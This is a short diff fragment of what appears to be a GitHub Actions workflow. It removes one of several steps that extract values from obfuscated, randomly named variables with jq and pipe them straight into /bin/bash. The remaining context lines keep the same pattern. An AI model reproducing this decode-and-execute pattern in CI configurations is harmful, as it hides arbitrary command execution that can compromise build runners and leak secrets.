@@ -24,7 +24,6 @@ jobs:
           echo $dwp2 | jq -r .sqb575 | /bin/bash
           printf '%s' "$qf7" | jq -r .afzs038 | /bin/bash
           printf '%s' "$mfrpp1" | jq -r .bsbq51046 | /bin/bash
-          echo $bcsfc857 | jq -r .z995 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
